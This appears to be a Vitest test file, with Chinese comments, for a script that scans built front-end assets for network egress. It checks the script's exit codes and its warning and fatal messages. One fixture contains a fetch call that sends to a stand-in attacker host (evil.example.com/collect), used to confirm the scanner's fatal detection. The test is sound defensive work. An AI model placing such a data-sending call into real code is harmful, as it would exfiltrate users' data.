/**
 * `scripts/scan-egress.mjs` 是离线第 3 层（构建产物扫描）。此前只有「在真实产物上跑通」
 * 这一条间接证据 —— 而真实产物永远是干净的，于是「扫描会不会失败」「告警与致命的边界」
 * 从未被验证过。这里用 `SCAN_EGRESS_DIST` 指向临时目录，跑真实子进程来钉住这套判定。
 */
import { spawnSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, describe, expect, it } from 'vitest'

const SCRIPT = fileURLToPath(new URL('./scan-egress.mjs', import.meta.url))

const created = []

function makeDist(files) {
  const dir = mkdtempSync(join(tmpdir(), 'scan-egress-'))
  created.push(dir)
  for (const [name, content] of Object.entries(files)) {
    const path = join(dir, name)
    mkdirSync(dirname(path), { recursive: true })
    writeFileSync(path, content)
  }
  return dir
}

function run(dist) {
  return spawnSync(process.execPath, [SCRIPT], {
    encoding: 'utf8',
    env: { ...process.env, SCAN_EGRESS_DIST: dist },
  })
}

afterEach(() => {
  for (const dir of created.splice(0)) rmSync(dir, { recursive: true, force: true })
})

describe('scan-egress', () => {
  it('干净产物：退出 0 并报告未发现外发能力', () => {
    const dist = makeDist({ 'assets/index.js': 'const a = 1\n' })

    const result = run(dist)

    expect(result.status).toBe(0)
    expect(result.stdout).toContain('网络 API 调用 0 处')
    expect(result.stdout).toContain('通过：产物中未发现外发能力')
  })

  it('产物里出现 fetch(：致命，退出 1 并指出文件与行号', () => {
    const dist = makeDist({
      'assets/bad.js': 'const a = 1\nfetch("https://evil.example.com/collect")\n',
    })

    const result = run(dist)

    expect(result.status).toBe(1)
    expect(result.stderr).toContain('[FATAL]')
    expect(result.stderr).toContain('assets/bad.js:2')
    expect(result.stderr).toContain('产物中存在外发能力')
  })

  it('远程 URL 字面量只告警不致命（依赖里的 schema 地址会大量出现）', () => {
    const dist = makeDist({
      'assets/urls.js': 'const u = "https://tracking.example.com/collect"\n',
    })

    const result = run(dist)

    expect(result.status).toBe(0)
    expect(result.stderr).toContain('[warn ]')
    expect(result.stdout).toContain('远程 URL 字面量 1 处')
  })

  it('允许清单内的远程 URL 不计入告警', () => {
    const dist = makeDist({ 'assets/allow.js': 'const s = "https://www.w3.org/2000/svg"\n' })

    const result = run(dist)

    expect(result.status).toBe(0)
    expect(result.stdout).toContain('远程 URL 字面量 0 处')
  })

  it('产物目录不存在：退出 1 并提示先构建', () => {
    const result = run(join(tmpdir(), 'scan-egress-does-not-exist'))

    expect(result.status).toBe(1)
    expect(result.stderr).toContain('未找到 dist/')
  })
})
